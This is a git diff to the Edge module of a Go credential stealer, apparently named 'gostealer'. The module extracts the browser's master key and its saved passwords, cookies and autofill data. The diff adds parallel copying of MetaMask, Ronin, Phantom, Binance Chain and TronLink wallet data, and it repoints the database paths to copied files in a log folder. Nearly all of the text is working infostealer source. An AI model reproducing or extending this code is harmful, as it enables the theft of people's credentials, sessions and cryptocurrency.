@@ -6,6 +6,7 @@ import (
 	"log"
 	"os"
 	"path"
+	"sync"
 
 	"github.com/4kord/gostealer/utils"
 	"github.com/4kord/gostealer/utils/decrypt"
@@ -15,6 +16,8 @@ import (
 )
 
 func Edge(browserPath, logFolderPath string) {
+	wg := sync.WaitGroup{}
+
 	browserKey := decrypt.GetBrowserEncryptedKey(browserPath)
 
 	err := os.WriteFile(path.Join(logFolderPath, "raw", "edge_masterkey.txt"), browserKey, 0644)
@@ -41,8 +44,28 @@ func Edge(browserPath, logFolderPath string) {
 		log.Println(err)
 	}
 
-	wallets.CopyMetamaskEdge(browserPath, logFolderPath)
-	wallets.CopyRoninEdge(browserPath, logFolderPath)
+	wg.Add(5)
+	go func() {
+		wallets.CopyMetamaskEdge(browserPath, logFolderPath)
+		wg.Done()
+	}()
+	go func() {
+		wallets.CopyRoninEdge(browserPath, logFolderPath)
+		wg.Done()
+	}()
+	go func() {
+		wallets.CopyPhantomEdge(browserPath, logFolderPath)
+		wg.Done()
+	}()
+	go func() {
+		wallets.CopyBinancechainEdge(browserPath, logFolderPath)
+		wg.Done()
+	}()
+	go func() {
+		wallets.CopyTronlinkEdge(browserPath, logFolderPath)
+		wg.Done()
+	}()
+	wg.Wait()
 }
 
 func getEdgePasswords(browserPath, logFolderPath string, key []byte) string {
@@ -52,7 +75,7 @@ func getEdgePasswords(browserPath, logFolderPath string, key []byte) string {
 		return ""
 	}
 
-	sqllitePath := path.Join(browserPath, "Default", "edge_login_data")
+	sqllitePath := path.Join(logFolderPath, "raw", "edge_login_data")
 
 	var data string
 
@@ -95,7 +118,7 @@ func getEdgeCookies(browserPath, logFolderPath string, key []byte) string {
 		return ""
 	}
 
-	sqllitePath := path.Join(browserPath, "Default", "Network", "edge_cookies")
+	sqllitePath := path.Join(logFolderPath, "raw", "edge_cookies")
 
 	var data string
 
@@ -139,7 +162,7 @@ func getEdgeAutofill(browserPath, logFolderPath string) string {
 		return ""
 	}
 
-	sqllitePath := path.Join(browserPath, "Default", "edge_web_data")
+	sqllitePath := path.Join(logFolderPath, "raw", "edge_web_data")
 
 	var data string
 
